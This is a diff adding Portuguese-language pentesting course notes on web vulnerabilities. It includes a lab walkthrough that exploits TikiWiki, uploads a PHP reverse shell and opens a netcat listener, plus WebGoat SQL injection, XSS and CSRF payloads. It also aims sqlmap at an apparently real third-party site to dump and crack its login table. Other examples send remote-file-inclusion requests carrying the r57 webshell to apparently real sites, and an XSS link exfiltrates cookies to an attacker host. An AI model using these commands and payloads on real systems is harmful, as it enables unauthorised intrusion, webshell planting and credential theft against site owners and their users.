@@ -1,0 +1,471 @@
+Vuln Em App Web
+===============
+
+Objetivos
+---------
+
+* Entender o funcionamentos das aplicações Web
+
+* Aprender a explorar as principais classes de vuln em apps web existentes.
+
+Os maiores vetores de ataque web são:
+	* Webmail
+	* Fórum
+	* Blogs
+	* Loja Virtuais
+
+As aplicações web trabalham de duas formas:
+
+	* Client-Side --> O processamento e as validações são feitas no cliente (Browser)
+	* Server-Side --> O Processamento e as validações são feitas no servidor (IIS, Apache, Tomcat, JBoss, etc..)
+
+Perigo
+
+	* Ganhar acesso a informações confidênciais, implicando no CIDAL.
+	* Galhar acessos em outros sistemas atráves das credenciais existente em uma base de dados, como vazamento de cartões de creditos e registros de pessoas/empresas.
+
+
+Falar sobre as questões das aplicações foram migradas para web e que os programadores não fazem a validação de todas as entradas podendo ser inseridas informações que a aplicações não foi projetada para receber (como um campo numerico com uma entrada alpha).
+
+Principais ameaças:
+	* Command Injectin
+	* SQL Inject
+	* Cross Site Script (XSS)
+	* CSRF
+	* Insecure Direct Object Reference
+	* Falha de Autenticação e gerenciamento de sessão
+	* Falhas em configuração de seguança
+	* Insecure Cryptographi Storage
+	* Failure to Restrict URL Access
+	* Insuficient Transport Layer Protection
+	* Unvalidated Redirects and Forwards
+
+Top 10 OWASP
+
+olhe o site para ficar antenado: http://www.owasp.org
+
+Para ver o Testing Guide basta acessar o link: https://www.owasp.org/index.php/Category:OWASP_Testing_Project
+
+command Injection
+=================
+	php-inject, ldap-inject, etc...
+
+Essas falhas ocorrem devido o uso de funções como system() e passthru() do php e não tradas pelo programado, permitindo a execução dos comandos no host remoto.
+
+o uso de caracteres de escape (; | < > ) podemos enviar direto ao S.O.
+
+Shell PHP (Webshell)
+
+no BT
+Applications --> BackTrack --> Maintaining Access --> Web Backdoors --> webshells
+
+Mostrar o c99.php.
+
+demostrar um acesso através do php-shell.php e do c99.php =] veja o video =]
+
+----+++++
+root@bt:~# nmap -sS -sV -O -n -f 172.30.0.20
+...
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
+...
+
+abre o browser e verifique que página esta no ar.
+
+Agora vamos abrir o DirBuster
+Application -> BackTrack -> Vulnarability Assessment -> web Application Assessment -> Web Application Fuzzers -> DirBuster
+
+ou
+
+root@bt:~# cd /pentest/web/dirbuster/
+root@bt:/pentest/web/dirbuster# ls
+apache-user-enum-1.0.txt       directory-list-2.3-small.txt
+apache-user-enum-2.0.txt       directory-list-lowercase-2.3-big.txt
+DirBuster-0.12.jar             directory-list-lowercase-2.3-medium.txt
+directory-list-1.0.txt         directory-list-lowercase-2.3-small.txt
+directory-list-2.3-big.txt     lib
+directory-list-2.3-medium.txt
+root@bt:/pentest/web/dirbuster# java -jar DirBuster-0.12.jar -u http://172.30.0.20
+
+No DirBuster
+vamos aumentar o numero de threads para 40
+
+Em File with list of dirs/files clique me Browser e selecione: directory-list-2.3-small.txt
+
+Clique em Start
+
+ele aponta um diretorio /doc/ vamos colocalo em nossa url no browser
+
+172.30.0.20/doc/ permissão negada erro 403
+
+olhe o diretorio /tikiwiki recebeu um 200 OK vamos entrar nele.
+
+172.30.0.20/tikiwiki
+
+abra uma nova aba no browser e vamos ao site do http://www.exploit-db.com
+
+em clique no botão search e em Description digite: tikiwiki
+
+selecione a vulnerabilidade:
+2006-11-01 	Exploit Code Downloads 	- 	Verified 	TikiWiki 1.9.5 Sirius (sort_mode) Information Disclosure Vulnerability 	1728 	php 	securfrog
+
+na pagina do exploit http://www.exploit-db.com/exploits/2701/ procure pela linha:
+
+/tiki-listpages.php?offset=0&sort_mode=
+
+Copie e cole no browser ficando assim:
+
+172.30.0.20/tikiwiki/tiki-listpages.php?offset=0&sort_mode=
+
+procure pela linha:
+
+   ["database"]=>
+        string(11) "tikiwiki195"
+        ["host"]=>
+        string(9) "localhost"
+        ["user"]=>
+        string(4) "root" <----+--> observe
+        ["password"]=>       /
+        string(4) "root" <--´
+
+agora vamos explorar com o metasploit
+root@bt:~# msfconsole -q
+msf > search tikiwiki
+
+Matching Modules
+================
+
+   Name                                             Disclosure Date  Rank       Description
+   ----                                             ---------------  ----       -----------
+   auxiliary/admin/tikiwiki/tikidblib               2006-11-01       normal     TikiWiki information disclosure
+   exploit/unix/webapp/php_xmlrpc_eval              2005-06-29       excellent  PHP XML-RPC Arbitrary Code Execution
+   exploit/unix/webapp/tikiwiki_graph_formula_exec  2007-10-10       excellent  TikiWiki tiki-graph_formula Remote PHP Code Execution
+   exploit/unix/webapp/tikiwiki_jhot_exec           2006-09-02       excellent  TikiWiki jhot Remote Command Execution
+
+
+msf > use auxiliary/admin/tikiwiki/tikidblib
+msf  auxiliary(tikidblib) > set RHOST 172.30.0.20
+RHOST => 172.30.0.20
+msf  auxiliary(tikidblib) > run
+
+[*] Establishing a connection to the target...
+[*] Get informations about database...
+[*] Install path : /var/www/tikiwiki/lib/tikidblib.php
+[*] DB type      : mysql
+[*] DB name      : tikiwiki195
+[*] DB host      : localhost
+[*] DB user      : root
+[*] DB password  : root
+[*] Auxiliary module execution completed
+msf  auxiliary(tikidblib) > 
+
+Veja os acessos a base de dadoss =]
+
+abra outro terminal e faça:
+root@bt:~# mysql -h 172.30.0.20 -u root -proot
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 16
+Server version: 5.0.51a-3ubuntu5 (Ubuntu)
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| tikiwiki           |
+| tikiwiki195        |
++--------------------+
+4 rows in set (0.21 sec)
+
+mysql> use tikiwiki195;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables
+    -> ;
++------------------------------------+
+| Tables_in_tikiwiki195              |
++------------------------------------+
+| galaxia_activities                 |
+| galaxia_activity_roles             |
+| galaxia_instance_activities        |
+| ...                                |
+| users_users                        |
++------------------------------------+
+194 rows in set (0.00 sec)
+
+mysql> select * from users_users;
++--------+-------+-------+----------+
+| userId | email | login | password |
++--------+-------+-------+----------+
+|      1 |       | admin | admin    |
++--------+-------+-------+----------+
+1 row in set (0.03 sec)
+
+mysql> 
+
+Olha a senha em clean-text ai =]
+
+vamos acessar a aplicação
+
+user: admin
+pass: admin
+
+agora vamos abrir o arquivo php-rev-shell.php
+
+altere a linha
+$ip = '127.0.0.1';
+para seu IP
+172.30.0.50
+
+volte a aplicação clique no link Backups
+
+em Upload backup -> clique em Browser -> selecione o arquivo php-rev-shell.php e clique em Open
+
+Clique em Upload
+
+após vamos abrir vamos criar um socket para receber a conexão reversa do nosso shell com o netcat
+
+# nc -lvp 1234
+
+
+agora vamos acessar nosso shellcode no endereço e coloque o endereços do backup + o shell
+
+172.30.0.20/tikiwiki/backups/php-rev-shell.php
+
+funcionou agora vamos explorar-lo
+
+
+----+++++
+
+
+http://www.preciorecord.com/index.asp?NomPagina=http://www.pudim.com.br
+http://www.mrs.com.br/interna.php?nomPagina=http://www.pudim.com.br
+
+http://www.mrs.com.br/interna.php?nomPagina=http://www.xfocus.net/tools/200608/r57.txt?
+
+RFI -> Remote File Include
+LFI -> Local File Inclusion
+
+
+SQL Inject
+==========
+
+Erro do progrqamador em não tratar corretamente as entradas em suas aplicações que faz uso da linguagem SQL-92.
+
+Com isso podemo injetar comandos SQL para pegar informações de suas bases.
+
+Qualquer aplicação que faça uso de base de dados idependente se é web ou não.
+
+tipos de strings passadas para a base.
+
+uma ferramenta muito boa para isso é sqlmap
+
+fazer um teste com o sqlmap
+
+cd /pentest/database/sqlmap
+
+./sqlmap.py -h
+
+a opção -tor para ser usado com o tor
+
+./sqlmap.py --update
+./sqlmap.py --wizard
+
+coloque a url com as variáveis
+exemplo: http://www.vitima.com.br/?pag=teste&id=10
+
+ou você pode passar os parametros, vamos fazer um passo a passo.
+
+Vamos ver qual é o nome da base de dados (--current-db)
+./sqlmap.py --url "http://www.acepf.com.br/?paginas=conteudo&id=20" --current-db
+current database: c1acpef
+
+Vamos agora ver quais são as tabelas (--tables)
+./sqlmap.py --url "http://www.acepf.com.br/?paginas=conteudo&id=20" -D "c1acpef" --tables
+
++---------------+
+| banners       |
+| xxxxxxxx      |
+| login         |
+| xxxxxxxx      |
++---------------+
+
+Vamos verificar quais os campos contido na tabela que nos interresa que é login (--columns)
+./sqlmap.py --url "http://www.acepf.com.br/?paginas=conteudo&id=20" -D "c1acpef" -T "login" --columns
+
++-----------+------------------+
+| Column    | Type             |
++-----------+------------------+
+| id        | int(10) unsigned |
+| login     | varchar(45)      |
+| senha     | varchar(32)      |
++-----------+------------------+
+
+Vamos agora fazer um dump das informações e e tentar quebrar essa senha com uma wordlist (--dump)
+./sqlmap.py --url "http://www.acepf.com.br/?paginas=conteudo&id=20" -D "c1acpef" -T "login" -C "login,senha" --dump
+
+Vai perguntar se desejamos quebrar: Y
+Pergunta se queremos usar uma wordlist ou usar a default: usaremos Default
+
+XSS (Cross Site Scripting)
+==========================
+
+	* roubo de sessões -> roubando os cookie e desta forma tomar a sessão do usuário.
+
+	* Injeção de Conteúdo -> fazendo uso do src para apontar um servidor que contenha toda a codificação complexa e injetando isso na aplicação vuneravel a XSS <script> src="http://ataque/malware.js"></script>
+
+	* Roubo de nomes e senhas de usuários -> Quando os usuários pedem para lembrar a senha para autenticar-se automaticamente.
+
+
+Executa no cliente código arbritário. Pode ser usado um site domíno confiável para disceminar malwares e ataques.
+
+se você visse um link parecido com isso em seu email você não clicaria? 
+http://meubanco.com.br/q?minha_conta=script>document.location="http://hackbanco.com.br/cgi-bin/session.cgi?'+document.cookie</script
+
+então há uma criticidade em dois sentidos aqui, uma a imagem da instituição que disponibilizou um sistema verdadeiro porém vulneravel que foi utilizado para rotear informações para uma terceira pessoa. E a pessoa que foi lesada pelo ataque.
+
+
+Você também pode usar para redirecionar uma vitima a um site que o atacante usa.
+
+Você pode criar uma tela de login forçando a vitima a inserir suas credenciais em uma messagebox fake e roubando as credenciais.
+
+demostrar:
+
+
+CSRF (Cross Site Request Forgery)
+=================================
+
+Semelhante a XSS
+
+Sua maior diferença é que ele fica fixado no servidor. É executado automaticamente ao entrar no site que contém a vulnerabilidade.
+
+
+muito usado para disceminar malware, e roubar informações da vítima e enviar para outro servidor.
+
+Direct Object Reference
+=======================
+
+É a possibilidade de alterar parametres de uma página
+
+Por exemplo a do site www.msr.com.br com a possibilidade de abrir outro site como se fizesse parte do site (em formulários).
+Assim como criar campos hidden e alterar o cook(admin=false) para true e ter acesso como administrador.
+
+faz uso da função allow_url_fopen()
+
+LFI (Local File Include)
+========================
+
+Possibilidades:
+
+	* Acessar Arquivos do SO
+	* Obter informações de Config
+		/etc/passwd
+		/proc/*
+		/etc/resolv.conf
+	* Execução de comandos
+	* Permite obter senhas e baixar arquivos fontes
+
+
+Falhas de Autenticação
+======================
+
+	* O que é sessão? sessão é um arquivo que contém as informações de sessão e suas credenciais onde ele se autentica automaticamente assim que você abre o navegador. Hijeck Sessions (sequestro de sessão)
+
+	* O que é Cookkie?
+
+	* Como fazer um ataque à sessão? 
+
+Estudar mais...
+
+
+Navegador Mantra é usado com todos os plugins de teste.
+
+Montar lo laboratorio WebGoat
+=============================
+
+para subir o webgoat temos que ter instalado na máquina os seguintes pacotes:
+	openjdk-6-jdk
+	openjdk-6-jre
+
+http://192.168.5.120:8080/WebGoat/attack
+
+Injection Flaws -> LAB: SQL Injection -> Stage 1: String SQL Injection
+
+Fazer um inpection na página e mostrar a pegadinha:
+<label>                                                             +------------------------------------------+
+	"Password                                                   v                                          |
+	<input name="password" type="password" size="10" maxlength="8">                                        |
+</label>                                              ^                                                        |
+                                                      `- ele permite digitar 10 caracteres porém ele só usa 8 -+
+resposta= 'or''='
+
+Injection Flaws -> LAB: SQL Injection -> String SQL Injection
+
+resposta= ' or 1<2-- , ' or 1=1-- , ' or '1'='1
+
+
+http://code.google.com/p/webgoat-ptbr/downloads/list
+
+How to XSS
+http://www.go4expert.com/forums/showthread.php?t=17066&utm_source=twtterfeed&utm_medium=twitter
+
+Tecnicas
+http://ha.ckers.org/xss.html
+
+Cross-Site Scripting (XSS) -> LAB: Cross Site Scripting -> stage 1: Stored XSS
+
+Logar como Tom e criar um XSS no campo Street do perfil dele.
+
+login: Tom Cat
+Pwd: tom
+
+2211 <script>alert("XSS");</script> , <script>alert(document.cookie);</script>
+
+Update -> Logout
+
+Logar como Jarry Mouse
+login: Jerry
+pwd: jerry
+
+seleciona o Tom Cat e Viewer Profile e verifique se o XSS funcionou.
+
+CSRF
+====
+
+Cross-Site Scripting (XSS) -> Cross Site Request Forgery (CSRF)
+
+o desafio está em injetar na mensagem o link como se fosse uma imagem de 1x1, este link é o próprio desafio com o parametro transferFunds=4000.
+
+Title: Qualquer um
+message: qualquer coisa <img src="http://guest:guest@192.168.5.130:8080/WebGoat/attack?Screen=13&menu=900&transferFunds=4000" width="1" height="1" />
+
+Tampering
+=========
+
+Parameter Tampering -> Exploit Hidden Filds
+
+Você precisa subir um WebProxy para você alterar a informação em transito.
+
+vamos em:
+
+Applications -> BackTrack -> Vulnerability Assessment -> Web Application Assessment -> Web Vulnerability Scanners -> WebScarab
+
+Na tela do WebScarab vá para a Intercept, selecione GET e POST em Methods, selecione o checkbox Intercept Resquests e Intercept Responses.
+
+Na aba Summaryselecione o checkbox Tree Selection filters conversation list e agora basta configurar como proxy no browser 127.0.0.1:8008
+
+agora clicamos em no botão Purchase, na caixa de Edite Request olhe a variável Prince e alter seu valor para 9,99 e clique no botão Accept Changes.
+
+
+Soluções
+========
+
+* Sanatizar o código, tem que verificar todas as entradas de dados em sua aplicação
+* Criptografia de senhas
+* Utilizar SSL TLS
+
+
